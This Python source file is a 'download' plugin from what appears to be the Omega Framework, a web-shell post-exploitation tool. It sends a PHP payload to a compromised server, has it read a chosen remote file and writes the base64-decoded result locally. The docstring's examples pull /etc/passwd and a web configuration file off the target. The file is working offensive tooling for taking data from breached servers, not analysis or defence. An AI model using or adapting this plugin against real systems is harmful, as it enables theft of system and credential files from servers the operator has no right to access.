#!/usr/bin/env python3

#            ---------------------------------------------------
#                              Omega Framework                                
#            ---------------------------------------------------
#                  Copyright (C) <2020>  <Entynetproject>       
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

r"""Download a remote file.

USAGE:
    download <remote_file> <local_path>

OPTIONS:
    -f
        Overwrite local directory without user confirmation.

DESCRIPTION:
    Download a remote file to your local system.
    - remote file must be readable.
    - local directory must be a writable directory.
    - if local directory is not provided, remote file is downloaded
    to the current working directory.
    - Unless '-f' option has been provided, user confirmation is
    needed to overwrite local directory (if it already exists).

LIMITATIONS:
    Recursive directory and multiple file downloads are not available.

EXAMPLES:
    > download /var/www/config.txt /tmp
      - Download the remote config.txt file into your local dir
    > download -f /etc/passwd /tmp
      - Download the current remote passwd file and force copy
"""

import sys
import os
import base64

import utils
import ui.input
from datatypes import Path

from api import plugin
from api import server

if not 2 <= len(plugin.argv) <= 4:
    sys.exit(plugin.help)


if plugin.argv[1] == "-f":
    force = True
    arg1 = 2
    arg2 = 3
    arglen = len(plugin.argv) - 1
else:
    force = False
    arg1 = 1
    arg2 = 2
    arglen = len(plugin.argv)

relpath = plugin.argv[arg1]

if arglen == 3:
    local_relpath = plugin.argv[arg2]
else:
    sys.exit(plugin.help)

abspath = server.path.abspath(relpath)
local_abspath = utils.path.truepath(local_relpath)
local_dirname = local_abspath
local_basename = server.path.basename(abspath)

if not os.path.isdir(local_dirname):
    local_dirname = os.path.dirname(local_dirname)
    if os.path.isdir(local_dirname):
        local_basename = os.path.basename(local_abspath)
    else:
        sys.exit("%s: Invalid local directory" % local_dirname)

try:
    Path(local_dirname, mode='w')
except ValueError:
    sys.exit("%s: Local directory not writable" % local_dirname)

local_abspath = os.path.join(local_dirname, local_basename)

if not force and os.path.exists(local_abspath):
    if os.path.isfile(local_abspath):
        question = "Local destination %s already exists, overwrite it?"
        if ui.input.Expect(False)(question % local_abspath):
            sys.exit("File transfer aborted")
    else:
        sys.exit("Local destination %s is already exists" % local_abspath)

payload = server.payload.Payload("payload.php")
payload['FILE'] = abspath

response = payload.send()

file = Path(local_abspath)
try:
    file.write(base64.b64decode(response), bin_mode=True)
except ValueError as err:
    sys.exit("Couldn't download file to %s: %s" % (local_abspath, err))

print("[+] File successfully downloaded!")
